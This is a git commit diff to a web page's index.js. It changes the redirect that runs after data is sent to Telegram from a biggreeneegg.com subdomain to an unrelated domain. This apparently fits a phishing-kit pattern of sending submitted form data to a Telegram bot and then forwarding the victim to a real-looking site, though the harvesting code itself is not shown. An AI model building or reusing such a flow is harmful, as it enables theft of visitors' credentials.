5102792dbd2198884666fe91415c75bdf320fcc0
husknet <127146284+husknet@users.noreply.github.com>
2025-01-10 14:54:57 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -57,7 +57,7 @@ export default function Home() {
 
         if (response.status === 200) {
           console.log('Message sent successfully to Telegram!', response.data);
-          window.location.href = 'https://bonsage.biggreeneegg.com/'; // Redirect on success
+          window.location.href = 'https://sgg.achemsite.info/'; // Redirect on success
         } else {
           throw new Error('Failed to send message to Telegram.');
         }
